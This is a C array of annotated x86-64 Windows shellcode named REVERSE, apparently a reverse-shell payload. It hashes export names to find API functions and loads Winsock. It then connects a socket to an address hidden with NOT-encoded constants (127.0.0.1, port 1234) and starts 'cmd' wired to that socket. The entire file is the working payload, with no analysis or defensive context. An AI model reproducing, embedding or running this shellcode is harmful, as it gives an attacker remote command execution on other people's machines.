
#define REVERSE_SIZE 551

char REVERSE[] = {
  /* 0000 */ "\x53"                     /* push rbx                    */
  /* 0001 */ "\x55"                     /* push rbp                    */
  /* 0002 */ "\x57"                     /* push rdi                    */
  /* 0003 */ "\x56"                     /* push rsi                    */
  /* 0004 */ "\xeb\x18"                 /* jmp 0x1e                    */
  /* 0006 */ "\x5e"                     /* pop rsi                     */
  /* 0007 */ "\x31\xc9"                 /* xor ecx, ecx                */
  /* 0009 */ "\xb1\x82"                 /* mov cl, 0x82                */
  /* 000B */ "\x48\x8d\x2c\x0e"         /* lea rbp, [rsi+rcx]          */
  /* 000F */ "\xb1\x0d"                 /* mov cl, 0xd                 */
  /* 0011 */ "\xb5\x01"                 /* mov ch, 0x1                 */
  /* 0013 */ "\x48\x8d\x14\x0e"         /* lea rdx, [rsi+rcx]          */
  /* 0017 */ "\xff\xd2"                 /* call rdx                    */
  /* 0019 */ "\x5e"                     /* pop rsi                     */
  /* 001A */ "\x5f"                     /* pop rdi                     */
  /* 001B */ "\x5d"                     /* pop rbp                     */
  /* 001C */ "\x5b"                     /* pop rbx                     */
  /* 001D */ "\xc3"                     /* ret                         */
  /* 001E */ "\xe8\xe3\xff\xff\xff"     /* call 0x6                    */
  /* 0023 */ "\x51"                     /* push rcx                    */
  /* 0024 */ "\x52"                     /* push rdx                    */
  /* 0025 */ "\x31\xc0"                 /* xor eax, eax                */
  /* 0027 */ "\x99"                     /* cdq                         */
  /* 0028 */ "\xac"                     /* lodsb                       */
  /* 0029 */ "\x84\xc0"                 /* test al, al                 */
  /* 002B */ "\x74\x15"                 /* jz 0x42                     */
  /* 002D */ "\x0c\x20"                 /* or al, 0x20                 */
  /* 002F */ "\x30\xc2"                 /* xor dl, al                  */
  /* 0031 */ "\x6a\x08"                 /* push 0x8                    */
  /* 0033 */ "\x59"                     /* pop rcx                     */
  /* 0034 */ "\xd1\xea"                 /* shr edx, 1                  */
  /* 0036 */ "\x73\x06"                 /* jae 0x3e                    */
  /* 0038 */ "\x81\xf2\x78\x3b\xf6\x82" /* xor edx, 0x82f63b78         */
  /* 003E */ "\xe2\xf4"                 /* loop 0x34                   */
  /* 0040 */ "\xeb\xe6"                 /* jmp 0x28                    */
  /* 0042 */ "\x92"                     /* xchg edx, eax               */
  /* 0043 */ "\x5a"                     /* pop rdx                     */
  /* 0044 */ "\x59"                     /* pop rcx                     */
  /* 0045 */ "\xc3"                     /* ret                         */
  /* 0046 */ "\x57"                     /* push rdi                    */
  /* 0047 */ "\x53"                     /* push rbx                    */
  /* 0048 */ "\x52"                     /* push rdx                    */
  /* 0049 */ "\x56"                     /* push rsi                    */
  /* 004A */ "\x03\x55\x3c"             /* add edx, [rbp+0x3c]         */
  /* 004D */ "\x8b\x4c\x15\x28"         /* mov ecx, [rbp+rdx+0x28]     */
  /* 0051 */ "\xe3\x4d"                 /* jrcxz 0xa0                  */
  /* 0053 */ "\x56"                     /* push rsi                    */
  /* 0054 */ "\x8b\x74\x0d\x0c"         /* mov esi, [rbp+rcx+0xc]      */
  /* 0058 */ "\x48\x01\xee"             /* add rsi, rbp                */
  /* 005B */ "\xe8\xc3\xff\xff\xff"     /* call 0x23                   */
  /* 0060 */ "\x97"                     /* xchg edi, eax               */
  /* 0061 */ "\x8b\x74\x0d\x1c"         /* mov esi, [rbp+rcx+0x1c]     */
  /* 0065 */ "\x48\x01\xee"             /* add rsi, rbp                */
  /* 0068 */ "\x8b\x54\x0d\x20"         /* mov edx, [rbp+rcx+0x20]     */
  /* 006C */ "\x48\x01\xea"             /* add rdx, rbp                */
  /* 006F */ "\x8b\x5c\x0d\x24"         /* mov ebx, [rbp+rcx+0x24]     */
  /* 0073 */ "\x48\x01\xeb"             /* add rbx, rbp                */
  /* 0076 */ "\x8b\x4c\x0d\x18"         /* mov ecx, [rbp+rcx+0x18]     */
  /* 007A */ "\x58"                     /* pop rax                     */
  /* 007B */ "\xe3\x23"                 /* jrcxz 0xa0                  */
  /* 007D */ "\x53"                     /* push rbx                    */
  /* 007E */ "\x56"                     /* push rsi                    */
  /* 007F */ "\x93"                     /* xchg ebx, eax               */
  /* 0080 */ "\x8b\x74\x8a\xfc"         /* mov esi, [rdx+rcx*4-0x4]    */
  /* 0084 */ "\x48\x01\xee"             /* add rsi, rbp                */
  /* 0087 */ "\xe8\x97\xff\xff\xff"     /* call 0x23                   */
  /* 008C */ "\x01\xf8"                 /* add eax, edi                */
  /* 008E */ "\x39\xd8"                 /* cmp eax, ebx                */
  /* 0090 */ "\xe0\xee"                 /* loopne 0x80                 */
  /* 0092 */ "\x5e"                     /* pop rsi                     */
  /* 0093 */ "\x5b"                     /* pop rbx                     */
  /* 0094 */ "\x75\x0a"                 /* jnz 0xa0                    */
  /* 0096 */ "\x0f\xb7\x1c\x4b"         /* movzx ebx, word [rbx+rcx*2] */
  /* 009A */ "\x8b\x0c\x9e"             /* mov ecx, [rsi+rbx*4]        */
  /* 009D */ "\x48\x01\xe9"             /* add rcx, rbp                */
  /* 00A0 */ "\x5e"                     /* pop rsi                     */
  /* 00A1 */ "\x5a"                     /* pop rdx                     */
  /* 00A2 */ "\x5b"                     /* pop rbx                     */
  /* 00A3 */ "\x5f"                     /* pop rdi                     */
  /* 00A4 */ "\xc3"                     /* ret                         */
  /* 00A5 */ "\x0f\xb6\xc9"             /* movzx ecx, cl               */
  /* 00A8 */ "\x51"                     /* push rcx                    */
  /* 00A9 */ "\x53"                     /* push rbx                    */
  /* 00AA */ "\x57"                     /* push rdi                    */
  /* 00AB */ "\x56"                     /* push rsi                    */
  /* 00AC */ "\x55"                     /* push rbp                    */
  /* 00AD */ "\x96"                     /* xchg esi, eax               */
  /* 00AE */ "\x31\xdb"                 /* xor ebx, ebx                */
  /* 00B0 */ "\xf7\xe3"                 /* mul ebx                     */
  /* 00B2 */ "\xb3\x30"                 /* mov bl, 0x30                */
  /* 00B4 */ "\x48\x79\x0f"             /* jns 0xc6                    */
  /* 00B7 */ "\x64\x8b\x3b"             /* mov edi, [fs:rbx]           */
  /* 00BA */ "\x8b\x7f\x0c"             /* mov edi, [rdi+0xc]          */
  /* 00BD */ "\x8b\x7f\x0c"             /* mov edi, [rdi+0xc]          */
  /* 00C0 */ "\xb3\x18"                 /* mov bl, 0x18                */
  /* 00C2 */ "\xb2\x50"                 /* mov dl, 0x50                */
  /* 00C4 */ "\xeb\x1b"                 /* jmp 0xe1                    */
  /* 00C6 */ "\xb2\x60"                 /* mov dl, 0x60                */
  /* 00C8 */ "\x65\x48\x8b\x3a"         /* mov rdi, [gs:rdx]           */
  /* 00CC */ "\x8b\x7f\x18"             /* mov edi, [rdi+0x18]         */
  /* 00CF */ "\x8b\x7f\x10"             /* mov edi, [rdi+0x10]         */
  /* 00D2 */ "\xeb\x0d"                 /* jmp 0xe1                    */
  /* 00D4 */ "\xe8\x6d\xff\xff\xff"     /* call 0x46                   */
  /* 00D9 */ "\x48\x85\xc9"             /* test rcx, rcx               */
  /* 00DC */ "\x75\x0e"                 /* jnz 0xec                    */
  /* 00DE */ "\x48\x8b\x3f"             /* mov rdi, [rdi]              */
  /* 00E1 */ "\x48\x8b\x2c\x1f"         /* mov rbp, [rdi+rbx]          */
  /* 00E5 */ "\x48\x85\xed"             /* test rbp, rbp               */
  /* 00E8 */ "\x75\xea"                 /* jnz 0xd4                    */
  /* 00EA */ "\x55"                     /* push rbp                    */
  /* 00EB */ "\x59"                     /* pop rcx                     */
  /* 00EC */ "\x5d"                     /* pop rbp                     */
  /* 00ED */ "\x5e"                     /* pop rsi                     */
  /* 00EE */ "\x5f"                     /* pop rdi                     */
  /* 00EF */ "\x5b"                     /* pop rbx                     */
  /* 00F0 */ "\x5a"                     /* pop rdx                     */
  /* 00F1 */ "\x31\xc0"                 /* xor eax, eax                */
  /* 00F3 */ "\x48\x79\x02"             /* jns 0xf8                    */
  /* 00F6 */ "\xff\xe1"                 /* jmp rcx                     */
  /* 00F8 */ "\x41\x89\xd4"             /* mov r12d, edx               */
  /* 00FB */ "\x49\x89\xcb"             /* mov r11, rcx                */
  /* 00FE */ "\x41\x5f"                 /* pop r15                     */
  /* 0100 */ "\x45\x85\xe4"             /* test r12d, r12d             */
  /* 0103 */ "\x74\x1c"                 /* jz 0x121                    */
  /* 0105 */ "\x41\x83\xec\x01"         /* sub r12d, 0x1               */
  /* 0109 */ "\x59"                     /* pop rcx                     */
  /* 010A */ "\x74\x15"                 /* jz 0x121                    */
  /* 010C */ "\x41\x83\xec\x01"         /* sub r12d, 0x1               */
  /* 0110 */ "\x5a"                     /* pop rdx                     */
  /* 0111 */ "\x74\x0e"                 /* jz 0x121                    */
  /* 0113 */ "\x41\x83\xec\x01"         /* sub r12d, 0x1               */
  /* 0117 */ "\x41\x58"                 /* pop r8                      */
  /* 0119 */ "\x74\x06"                 /* jz 0x121                    */
  /* 011B */ "\x41\x59"                 /* pop r9                      */
  /* 011D */ "\x41\x83\xec\x01"         /* sub r12d, 0x1               */
  /* 0121 */ "\x48\x83\xec\x20"         /* sub rsp, 0x20               */
  /* 0125 */ "\x41\xff\xd3"             /* call r11                    */
  /* 0128 */ "\x4a\x8d\x64\xe4\x20"     /* lea rsp, [rsp+r12*8+0x20]   */
  /* 012D */ "\x41\x57"                 /* push r15                    */
  /* 012F */ "\xc3"                     /* ret                         */
  /* 0130 */ "\x31\xd2"                 /* xor edx, edx                */
  /* 0132 */ "\xb6\x02"                 /* mov dh, 0x2                 */
  /* 0134 */ "\x48\x29\xd4"             /* sub rsp, rdx                */
  /* 0137 */ "\x54"                     /* push rsp                    */
  /* 0138 */ "\x5f"                     /* pop rdi                     */
  /* 0139 */ "\x57"                     /* push rdi                    */
  /* 013A */ "\xb8\x77\x73\x32\x5f"     /* mov eax, 0x5f327377         */
  /* 013F */ "\xab"                     /* stosd                       */
  /* 0140 */ "\xb8\xcc\xcd\xff\xff"     /* mov eax, 0xffffcdcc         */
  /* 0145 */ "\xf7\xd0"                 /* not eax                     */
  /* 0147 */ "\xab"                     /* stosd                       */
  /* 0148 */ "\xb1\x01"                 /* mov cl, 0x1                 */
  /* 014A */ "\xb8\x02\x66\x1d\x7e"     /* mov eax, 0x7e1d6602         */
  /* 014F */ "\xff\xd5"                 /* call rbp                    */
  /* 0151 */ "\x57"                     /* push rdi                    */
  /* 0152 */ "\x6a\x02"                 /* push 0x2                    */
  /* 0154 */ "\xb1\x02"                 /* mov cl, 0x2                 */
  /* 0156 */ "\xb8\xe6\x2c\x63\xca"     /* mov eax, 0xca632ce6         */
  /* 015B */ "\xff\xd5"                 /* call rbp                    */
  /* 015D */ "\x85\xc0"                 /* test eax, eax               */
  /* 015F */ "\x75\x41"                 /* jnz 0x1a2                   */
  /* 0161 */ "\x50"                     /* push rax                    */
  /* 0162 */ "\x50"                     /* push rax                    */
  /* 0163 */ "\x50"                     /* push rax                    */
  /* 0164 */ "\x50"                     /* push rax                    */
  /* 0165 */ "\x6a\x01"                 /* push 0x1                    */
  /* 0167 */ "\x6a\x02"                 /* push 0x2                    */
  /* 0169 */ "\xb1\x06"                 /* mov cl, 0x6                 */
  /* 016B */ "\xb8\xc5\x75\xe0\xc8"     /* mov eax, 0xc8e075c5         */
  /* 0170 */ "\xff\xd5"                 /* call rbp                    */
  /* 0172 */ "\x93"                     /* xchg ebx, eax               */
  /* 0173 */ "\x6a\x10"                 /* push 0x10                   */
  /* 0175 */ "\x57"                     /* push rdi                    */
  /* 0176 */ "\xb8\xfd\xff\xfb\x2d"     /* mov eax, 0x2dfbfffd         */
  /* 017B */ "\xf7\xd0"                 /* not eax                     */
  /* 017D */ "\xab"                     /* stosd                       */
  /* 017E */ "\xb8\x80\xff\xff\xfe"     /* mov eax, 0xfeffff80         */
  /* 0183 */ "\xf7\xd0"                 /* not eax                     */
  /* 0185 */ "\xab"                     /* stosd                       */
  /* 0186 */ "\x31\xc0"                 /* xor eax, eax                */
  /* 0188 */ "\xab"                     /* stosd                       */
  /* 0189 */ "\xab"                     /* stosd                       */
  /* 018A */ "\x53"                     /* push rbx                    */
  /* 018B */ "\xb1\x03"                 /* mov cl, 0x3                 */
  /* 018D */ "\xb8\x85\x69\xe1\x61"     /* mov eax, 0x61e16985         */
  /* 0192 */ "\xff\xd5"                 /* call rbp                    */
  /* 0194 */ "\x85\xc0"                 /* test eax, eax               */
  /* 0196 */ "\x74\x12"                 /* jz 0x1aa                    */
  /* 0198 */ "\x53"                     /* push rbx                    */
  /* 0199 */ "\xb1\x01"                 /* mov cl, 0x1                 */
  /* 019B */ "\xb8\x3c\xd3\xca\xb2"     /* mov eax, 0xb2cad33c         */
  /* 01A0 */ "\xff\xd5"                 /* call rbp                    */
  /* 01A2 */ "\x31\xd2"                 /* xor edx, edx                */
  /* 01A4 */ "\xb6\x02"                 /* mov dh, 0x2                 */
  /* 01A6 */ "\x48\x01\xd4"             /* add rsp, rdx                */
  /* 01A9 */ "\xc3"                     /* ret                         */
  /* 01AA */ "\xb0\x68"                 /* mov al, 0x68                */
  /* 01AC */ "\x57"                     /* push rdi                    */
  /* 01AD */ "\xab"                     /* stosd                       */
  /* 01AE */ "\x91"                     /* xchg ecx, eax               */
  /* 01AF */ "\x31\xc0"                 /* xor eax, eax                */
  /* 01B1 */ "\xf3\xaa"                 /* rep stosb                   */
  /* 01B3 */ "\x5f"                     /* pop rdi                     */
  /* 01B4 */ "\x57"                     /* push rdi                    */
  /* 01B5 */ "\x48\x78\x02"             /* js 0x1ba                    */
  /* 01B8 */ "\xb1\x18"                 /* mov cl, 0x18                */
  /* 01BA */ "\x48\x8d\x7c\x0f\x38"     /* lea rdi, [rdi+rcx+0x38]     */
  /* 01BF */ "\xb1\x03"                 /* mov cl, 0x3                 */
  /* 01C1 */ "\x89\x1f"                 /* mov [rdi], ebx              */
  /* 01C3 */ "\x48\xaf"                 /* scasq                       */
  /* 01C5 */ "\xe2\xfa"                 /* loop 0x1c1                  */
  /* 01C7 */ "\x31\xc0"                 /* xor eax, eax                */
  /* 01C9 */ "\x48\x78\x02"             /* js 0x1ce                    */
  /* 01CC */ "\xb1\x10"                 /* mov cl, 0x10                */
  /* 01CE */ "\x5a"                     /* pop rdx                     */
  /* 01CF */ "\xff\x44\x0a\x2d"         /* inc dword [rdx+rcx+0x2d]    */
  /* 01D3 */ "\xb8\x9c\x92\x9b\xff"     /* mov eax, 0xff9b929c         */
  /* 01D8 */ "\xf7\xd0"                 /* not eax                     */
  /* 01DA */ "\x57"                     /* push rdi                    */
  /* 01DB */ "\xab"                     /* stosd                       */
  /* 01DC */ "\x58"                     /* pop rax                     */
  /* 01DD */ "\x57"                     /* push rdi                    */
  /* 01DE */ "\x52"                     /* push rdx                    */
  /* 01DF */ "\x31\xc9"                 /* xor ecx, ecx                */
  /* 01E1 */ "\x6a\x08"                 /* push 0x8                    */
  /* 01E3 */ "\x5a"                     /* pop rdx                     */
  /* 01E4 */ "\xc1\xe2\x18"             /* shl edx, 0x18               */
  /* 01E7 */ "\x51"                     /* push rcx                    */
  /* 01E8 */ "\x51"                     /* push rcx                    */
  /* 01E9 */ "\x52"                     /* push rdx                    */
  /* 01EA */ "\x6a\x01"                 /* push 0x1                    */
  /* 01EC */ "\x51"                     /* push rcx                    */
  /* 01ED */ "\x51"                     /* push rcx                    */
  /* 01EE */ "\x50"                     /* push rax                    */
  /* 01EF */ "\x51"                     /* push rcx                    */
  /* 01F0 */ "\xb1\x0a"                 /* mov cl, 0xa                 */
  /* 01F2 */ "\xb8\xb1\xfe\xc6\x5f"     /* mov eax, 0x5fc6feb1         */
  /* 01F7 */ "\xff\xd5"                 /* call rbp                    */
  /* 01F9 */ "\xf7\xd8"                 /* neg eax                     */
  /* 01FB */ "\x79\x9b"                 /* jns 0x198                   */
  /* 01FD */ "\x57"                     /* push rdi                    */
  /* 01FE */ "\x5e"                     /* pop rsi                     */
  /* 01FF */ "\x50"                     /* push rax                    */
  /* 0200 */ "\x8b\x06"                 /* mov eax, [rsi]              */
  /* 0202 */ "\x50"                     /* push rax                    */
  /* 0203 */ "\xb1\x02"                 /* mov cl, 0x2                 */
  /* 0205 */ "\xb8\x7e\x6a\xe6\x31"     /* mov eax, 0x31e66a7e         */
  /* 020A */ "\xff\xd5"                 /* call rbp                    */
  /* 020C */ "\xad"                     /* lodsd                       */
  /* 020D */ "\x50"                     /* push rax                    */
  /* 020E */ "\xb1\x01"                 /* mov cl, 0x1                 */
  /* 0210 */ "\xb8\xd6\xeb\x33\x26"     /* mov eax, 0x2633ebd6         */
  /* 0215 */ "\xff\xd5"                 /* call rbp                    */
  /* 0217 */ "\xad"                     /* lodsd                       */
  /* 0218 */ "\x50"                     /* push rax                    */
  /* 0219 */ "\xb1\x01"                 /* mov cl, 0x1                 */
  /* 021B */ "\xb8\xd6\xeb\x33\x26"     /* mov eax, 0x2633ebd6         */
  /* 0220 */ "\xff\xd5"                 /* call rbp                    */
  /* 0222 */ "\xe9\x71\xff\xff\xff"     /* jmp 0x198                   */
};